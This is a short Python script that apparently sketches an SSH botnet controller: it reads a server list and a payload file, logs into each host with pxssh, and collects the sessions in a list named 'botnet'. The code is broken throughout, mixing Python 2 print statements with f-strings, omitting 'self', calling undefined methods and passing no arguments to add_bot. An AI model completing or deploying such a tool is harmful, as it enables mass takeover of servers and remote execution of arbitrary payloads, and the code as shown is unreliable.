import os,sys
from pexpect import pxssh

serverlist = sys.argv[1]
readserverlist = open(f"{serverlist}", "r")
payload = sys.argv[2]
readpayload = open(f"{payload}", "r")
execute = f"{readpayload}"

class Scan:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    def Login(host, user, password):
        try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            return s
        except Exception as e:
            print "Unable to Establish Connection!"
            print f"{e}"

    botnet = []

    def add_bot(host, user, password):
        new_bot = Scan(host, user, password)
        botnet.append(new_bot)

    for server in readserverlist:
        add_bot()